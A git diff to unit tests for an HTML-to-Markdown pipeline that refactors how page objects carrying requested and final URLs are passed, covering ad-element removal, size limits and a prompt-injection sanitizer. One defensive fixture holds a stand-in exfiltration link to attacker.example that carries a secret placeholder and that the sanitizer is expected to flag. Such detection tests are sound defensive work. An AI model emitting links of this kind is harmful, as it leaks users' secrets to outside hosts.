@@ -16,6 +16,11 @@ const elementHidingHtml = readFileSync(
   join(process.cwd(), 'test/unit/fixtures/element-hiding.html'),
   'utf8',
 );
+const elementHidingPage = {
+  requestedUrl: elementHidingUrl,
+  finalUrl: elementHidingUrl,
+  html: elementHidingHtml,
+};
 const removedTargetMarkers = [
   'id="eh-id"',
   'class="eh-class"',
@@ -31,7 +36,7 @@ describe('HTML to Markdown Pipeline', () => {
   });
 
   test('removes element-hiding targets before markdown conversion', async () => {
-    const result = await pipeline.process(elementHidingUrl, elementHidingHtml);
+    const result = await pipeline.process(elementHidingPage);
     const markdown = result.markdown;
 
     assert.ok(markdown);
@@ -58,12 +63,13 @@ describe('HTML to Markdown Pipeline', () => {
 
   test('counts survive', async () => {
     const cleaned = await new CleanHtmlAdsAdblockRs().invoke({
-      url: elementHidingUrl,
+      requestedUrl: elementHidingUrl,
+      finalUrl: elementHidingUrl,
       html: elementHidingHtml,
       removed: 0,
       skipped: 0,
     });
-    const result = await pipeline.process(elementHidingUrl, elementHidingHtml);
+    const result = await pipeline.process(elementHidingPage);
 
     assert.equal(result.removed, cleaned.removed);
     assert.equal(result.skipped, cleaned.skipped);
@@ -89,7 +95,7 @@ describe('HTML to Markdown Pipeline', () => {
     ]);
 
     const html = elementHidingHtml.replace('</body>', `${hiddenPayload}</body>`);
-    await local.process(elementHidingUrl, html);
+    await local.process({ ...elementHidingPage, html });
 
     for (const marker of removedTargetMarkers) {
       assert.equal(elementHidingHtml.includes(marker), true, marker);
@@ -119,7 +125,7 @@ describe('HTML to Markdown Pipeline', () => {
     };
     const local = new HtmlToMarkdownPipeline([cleaner, markdowner]);
 
-    await assert.rejects(() => local.process(elementHidingUrl, elementHidingHtml));
+    await assert.rejects(() => local.process(elementHidingPage));
     assert.equal(markdownerCalled, false);
   });
 
@@ -134,7 +140,10 @@ describe('HTML to Markdown Pipeline', () => {
     const local = new HtmlToMarkdownPipeline([new PromptInjectionRemoverSanitizer(), markdowner]);
     const html = '<p>Visible</p><a href="https://attacker.example/collect?data={{secret}}">Link</a>';
 
-    const result = await local.process('https://example.com/', html);
+    const result = await local.process({
+      requestedUrl: 'https://example.com/',
+      finalUrl: 'https://example.com/', html,
+    });
 
     assert.ok(handed);
     assert.ok(handed.found?.includes('exfil-urls'));
@@ -157,7 +166,11 @@ describe('HTML to Markdown Pipeline', () => {
     const local = new HtmlToMarkdownPipeline([new PromptInjectionRemoverSanitizer(), markdowner]);
 
     await assert.rejects(() =>
-      local.process('https://example.com/', 'x'.repeat(10 * 1024 * 1024 + 1)),
+      local.process({
+        requestedUrl: 'https://example.com/',
+        finalUrl: 'https://example.com/',
+        html: 'x'.repeat(10 * 1024 * 1024 + 1),
+      }),
     );
     assert.equal(markdownerCalled, false);
   });
@@ -172,10 +185,11 @@ describe('HTML to Markdown Pipeline', () => {
     };
     const local = new HtmlToMarkdownPipeline([first, new CleanHtmlToMarkdownDefuddle()]);
 
-    await local.process(elementHidingUrl, elementHidingHtml);
+    await local.process(elementHidingPage);
 
     assert.deepEqual(handed, {
-      url: elementHidingUrl,
+      requestedUrl: elementHidingUrl,
+      finalUrl: elementHidingUrl,
       html: elementHidingHtml,
       removed: 0,
       skipped: 0,
